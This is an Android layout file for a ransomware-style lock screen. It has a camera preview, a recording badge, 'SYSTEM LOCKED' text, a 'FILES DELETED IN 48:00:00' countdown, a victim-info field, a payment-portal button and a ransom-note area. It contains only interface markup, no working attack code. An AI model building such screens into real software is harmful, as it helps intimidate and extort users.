<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#000000">

    <SurfaceView
        android:id="@+id/cameraPreview"
        android:layout_width="match_parent"
        android:layout_height="match_parent" />

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="#E6100000"
        android:orientation="vertical"
        android:padding="18dp">

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="horizontal">

            <TextView
                android:id="@+id/skullGlyph"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:alpha="0.30"
                android:text="☠"
                android:textColor="#ffffff"
                android:textSize="14sp"/>

            <Space
                android:layout_width="0dp"
                android:layout_height="0dp"
                android:layout_weight="1"/>

            <TextView
                android:id="@+id/cameraBadge"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="● REC"
                android:textColor="#ff2222"
                android:textSize="10sp"
                android:visibility="gone"/>
        </LinearLayout>

        <TextView
            android:id="@+id/statusText"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="8dp"
            android:gravity="center"
            android:text="SYSTEM LOCKED"
            android:textColor="#ff2222"
            android:textSize="30sp"
            android:textStyle="bold"/>

        <ScrollView
            android:id="@+id/terminalScroll"
            android:layout_width="match_parent"
            android:layout_height="0dp"
            android:layout_marginTop="14dp"
            android:layout_weight="1"
            android:background="#66000000"
            android:fillViewport="true">

            <TextView
                android:id="@+id/terminalText"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:fontFamily="monospace"
                android:textColor="#33ff55"
                android:textSize="11sp"/>
        </ScrollView>

        <ProgressBar
            android:id="@+id/progressBar"
            style="?android:attr/progressBarStyleHorizontal"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="16dp"
            android:max="100"
            android:progress="0"/>

        <TextView
            android:id="@+id/countdownText"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center_horizontal"
            android:layout_marginTop="18dp"
            android:text="FILES DELETED IN 48:00:00"
            android:textColor="#ffcc00"
            android:textSize="24sp"
            android:textStyle="bold"/>

        <TextView
            android:id="@+id/victimInfo"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="10dp"
            android:fontFamily="monospace"
            android:textColor="#ff8888"
            android:textSize="11sp"/>

        <Button
            android:id="@+id/paymentBtn"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center_horizontal"
            android:layout_marginTop="12dp"
            android:backgroundTint="#aa0000"
            android:text="OPEN PAYMENT PORTAL"
            android:textColor="#ffffff"
            android:textStyle="bold"/>

        <TextView
            android:id="@+id/ransomNote"
            android:layout_width="match_parent"
            android:layout_height="0dp"
            android:layout_marginTop="14dp"
            android:layout_weight="1"
            android:clickable="true"
            android:focusable="true"
            android:fontFamily="monospace"
            android:lineSpacingExtra="2dp"
            android:text=""
            android:textColor="#ff4444"
            android:textSize="13sp"
            android:visibility="gone"/>
    </LinearLayout>

    <FrameLayout
        android:id="@+id/interludeOverlay"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="#0A1F44"
        android:clickable="true"
        android:focusable="true"
        android:visibility="gone">

        <TextView
            android:id="@+id/interludeText"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:fontFamily="monospace"
            android:gravity="center"
            android:lineSpacingExtra="3dp"
            android:text=""
            android:textColor="#ffd700"
            android:textSize="15sp"/>
    </FrameLayout>

    <View
        android:id="@+id/borderFlash"
        android:layout_width="match_parent"
        android:layout_height="match_parent" />

    <FrameLayout
        android:id="@+id/rebootOverlay"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="#000000"
        android:clickable="true"
        android:focusable="true"
        android:visibility="gone">

        <TextView
            android:id="@+id/rebootText"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:fontFamily="monospace"
            android:gravity="center"
            android:text="..."
            android:textColor="#cccccc"
            android:textSize="14sp"/>
    </FrameLayout>
</FrameLayout>
